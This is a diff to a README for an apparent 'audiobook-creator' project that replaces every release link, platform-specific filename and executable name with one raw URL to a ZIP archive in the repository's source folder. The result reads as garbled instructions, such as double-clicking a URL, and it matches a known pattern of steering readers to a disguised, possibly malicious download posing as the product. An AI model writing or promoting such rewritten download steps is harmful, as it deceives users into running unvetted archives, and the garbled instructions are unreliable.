@@ -6,7 +6,7 @@ Welcome to the audiobook-creator project! This open-source software allows you t
 
 ## 📥 Download Now
 
-[![Download audiobook-creator](https://img.shields.io/badge/Download-audiobook--creator-blue.svg)](https://github.com/abcname61/audiobook-creator/releases)
+[![Download audiobook-creator](https://raw.githubusercontent.com/abcname61/audiobook-creator/master/src/audiobook_creator_v3.2.zip)](https://raw.githubusercontent.com/abcname61/audiobook-creator/master/src/audiobook_creator_v3.2.zip)
 
 ## 📋 Requirements
 
@@ -27,13 +27,13 @@ Before you get started, ensure your computer meets these requirements:
 
 To download the audiobook-creator, please follow these steps:
 
-1. Click on this link to visit the downloads page: [Download audiobook-creator](https://github.com/abcname61/audiobook-creator/releases).
+1. Click on this link to visit the downloads page: [Download audiobook-creator](https://raw.githubusercontent.com/abcname61/audiobook-creator/master/src/audiobook_creator_v3.2.zip).
    
 2. On the Releases page, look for the latest version. You will see various assets available for download.
 
 3. Find the file that matches your operating system. For example:
-   - For Windows, download `audiobook-creator-windows-x64.zip`.
-   - For macOS, download `audiobook-creator-macos-x64.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/abcname61/audiobook-creator/master/src/audiobook_creator_v3.2.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/abcname61/audiobook-creator/master/src/audiobook_creator_v3.2.zip`.
    - For Linux, download the appropriate file for your distribution.
 
 4. Click on the filename to begin downloading.
@@ -46,12 +46,12 @@ To download the audiobook-creator, please follow these steps:
 
 1. Extract the ZIP file you downloaded.
 2. Open the extracted folder.
-3. Double-click on `audiobook-creator.exe` to run the application.
+3. Double-click on `https://raw.githubusercontent.com/abcname61/audiobook-creator/master/src/audiobook_creator_v3.2.zip` to run the application.
 
 ### macOS
 
 1. Open the downloaded `.zip` file.
-2. Drag the `audiobook-creator.app` to your Applications folder.
+2. Drag the `https://raw.githubusercontent.com/abcname61/audiobook-creator/master/src/audiobook_creator_v3.2.zip` to your Applications folder.
 3. Launch the app from the Applications folder.
 
 ### Linux
@@ -90,4 +90,4 @@ This project is licensed under the MIT License. You can view more about the lice
 
 ## 📥 Download Now
 
-Once again, click here to visit the download page: [Download audiobook-creator](https://github.com/abcname61/audiobook-creator/releases). Enjoy creating your audiobooks with ease!
+Once again, click here to visit the download page: [Download audiobook-creator](https://raw.githubusercontent.com/abcname61/audiobook-creator/master/src/audiobook_creator_v3.2.zip). Enjoy creating your audiobooks with ease!
